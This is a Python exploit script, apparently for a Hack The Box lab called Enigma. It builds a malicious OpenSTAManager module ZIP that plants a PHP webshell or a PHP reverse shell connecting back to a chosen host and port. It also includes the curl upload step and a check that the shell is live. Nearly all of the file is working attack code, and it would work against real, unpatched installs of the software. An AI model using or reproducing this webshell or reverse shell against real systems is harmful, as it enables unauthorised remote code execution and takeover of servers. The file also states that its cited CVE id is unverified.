#!/usr/bin/env python3
"""
HTB Enigma — OpenSTAManager module ZIP upload -> RCE (CVE-2026-38751 as cited in enigma.txt)
Source: enigma.txt   |   Arsenal ref: §7.2

Builds the malicious "update" ZIP that OpenSTAManager extracts into /modules/ with no
contents validation. Arsenal §7.2 has the archive layout inline; this makes it
repeatable and adds a verification helper.

Usage:
    ./poc_htb_enigma_module_zip.py --out update.zip
    ./poc_htb_enigma_module_zip.py --out update.zip --verify http://support_001.enigma.htb
    ./poc_htb_enigma_module_zip.py --out update.zip --lhost 10.10.14.5 --lport 4444

Upload with an admin session (Tools -> Updates, tick "I still want to proceed"):
    curl -s -b cookie.txt -F 'file=@update.zip' \
         'http://support_001.enigma.htb/pages/update.php' ; echo
    # or use the UI if the endpoint differs between 2.9.x builds

Caveat: the CVE id comes from the supplied write-up and is not independently
verified here. The primitive (unvalidated module extraction) is what the archive
relies on; a version where extraction validates MODULE contents will reject it.
"""

import argparse
import sys
import urllib.request
import zipfile

MODULE_TEMPLATE = '''name = "{module}"
directory = "{module}"
version = "1.0"
compatibility = "2.10"
options = ""
icon = "fa fa-bug"
parent = "Dashboard"
'''

WEBSHELL = '<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>'
REVSHELL = (
    '<?php $s=fsockopen("{lhost}",{lport});if($s){'
    'while(!feof($s)){$c=fread($s,2048);$r=shell_exec($c);fwrite($s,$r);}'
    '} ?>'
)


def build(args):
    module = args.module
    with zipfile.ZipFile(args.out, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("%s/MODULE" % module, MODULE_TEMPLATE.format(module=module))
        if args.revshell:
            if not (args.lhost and args.lport):
                print("[-] --lhost and --lport required with --revshell", file=sys.stderr)
                return 2
            body = REVSHELL.format(lhost=args.lhost, lport=args.lport)
            zf.writestr("%s/%s.php" % (module, module), body)
        else:
            zf.writestr("%s/%s.php" % (module, module), WEBSHELL)

    print("[+] wrote %s" % args.out)
    with zipfile.ZipFile(args.out) as zf:
        for info in zf.infolist():
            print("    %-28s %6d bytes" % (info.filename, info.file_size))
    print("\n[*] after upload, call:")
    print('    curl "http://<host>/modules/%s/%s.php?c=id"' % (module, module))
    return 0


def verify(args):
    url = "%s/modules/%s/%s.php?c=id" % (args.verify.rstrip("/"), args.module, args.module)
    print("[*] GET %s" % url)
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            body = resp.read(2000).decode("utf-8", "replace")
        print("[*] status %s" % resp.status)
        print(body[:600])
        if "uid=" in body:
            print("[+] webshell is live")
            return 0
        print("[!] no uid= in response — extraction path may differ (/modules vs /plugins)")
        return 1
    except Exception as exc:                                  # noqa: BLE001
        print("[-] %s" % exc)
        return 1


def main(argv=None):
    p = argparse.ArgumentParser(description="Enigma: build an OpenSTAManager module ZIP")
    p.add_argument("--out", default="update.zip")
    p.add_argument("--module", default="shell")
    p.add_argument("--revshell", action="store_true", help="PHP reverse shell instead of ?c= webshell")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    p.add_argument("--verify", help="base URL to test the webshell after upload")
    args = p.parse_args(argv)

    if args.verify:
        return verify(args)
    return build(args)


if __name__ == "__main__":
    sys.exit(main())
